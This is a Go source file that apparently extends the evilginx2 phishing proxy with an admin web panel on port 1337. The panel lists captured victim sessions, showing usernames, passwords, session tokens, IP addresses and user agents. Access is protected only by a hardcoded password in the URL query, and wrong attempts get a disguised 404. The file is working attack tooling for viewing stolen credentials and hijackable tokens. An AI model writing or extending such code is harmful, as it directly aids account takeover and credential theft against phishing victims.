package core

import (
	"fmt"
	"html/template"
	"net/http"
	"path/filepath"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type BaseTemplateData struct {
	PageTitle string
	Sessions  []DisplaySession
}

// Data strucutre : key-value pair for Bunt DB
type DisplaySession struct {
	ID          int    `json:"id"`
	Phishlet    string `json:"phishlet"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Tokens      string `json:"tokens"`
	Remote_addr string `json:"remote_addr"`
	Useragent   string `json:"useragent"`
	Update_time int64  `json:"update_time"`
}

// APIResponse structure : send data to UI
type APIResponse struct {
	Body string `json:"body"`
}

// Database pointer
var (
	admin_cfg *Config
	admin_db  *database.Database
	cfg_path  string
	pwdStr    = "668dfrAB"
)

func NewAdmin(db *database.Database, cfg *Config, path string) {
	admin_db = db
	cfg_path = path
	admin_cfg = cfg

	http.HandleFunc("/listSessions", getAllData)
	log.Info("Admin panel started at %s\n", fmt.Sprintf("https://%v:1337/listSessions?pwd=%v", cfg.baseDomain, pwdStr))

	go func() {
		if err := http.ListenAndServe(":1337", nil); err != nil {
			log.Fatal("Failed to start admin panel on port 1337")
		}
	}()
}

// Function to read data
func getAllData(w http.ResponseWriter, r *http.Request) {
	pwd := r.URL.Query().Get("pwd")
	if pwd != pwdStr {
		w.WriteHeader(404)
		w.Write([]byte("404 page not found"))
		return
	}

	// open the specified DB
	db := admin_db

	sessions, err := db.ListSessions()
	if err != nil {
		log.Error("listsessions: %v", err)
	}
	var displaySessions []DisplaySession
	for i := 0; i < len(sessions); i++ {
		sess := sessions[i]
		pl := getPhishlet(sess.Phishlet)
		tokns := TokensToJSON(pl, sess.Tokens)
		displaySessions = append(displaySessions, DisplaySession{
			ID:          sess.Id,
			Phishlet:    sess.Phishlet,
			Username:    sess.Username,
			Password:    sess.Password,
			Tokens:      tokns,
			Remote_addr: sess.RemoteAddr,
			Useragent:   sess.UserAgent,
			Update_time: sess.UpdateTime,
		})
	}

	tmpl := template.Must(template.ParseFiles(filepath.Join(cfg_path, "admin.html")))
	data := BaseTemplateData{
		PageTitle: "SESSIONS",
		Sessions:  displaySessions,
	}
	tmpl.Execute(w, data)
}

func getPhishlet(name string) *Phishlet {
	for site, pl := range admin_cfg.phishlets {
		if site == name {
			return pl
		}
	}
	return nil
}
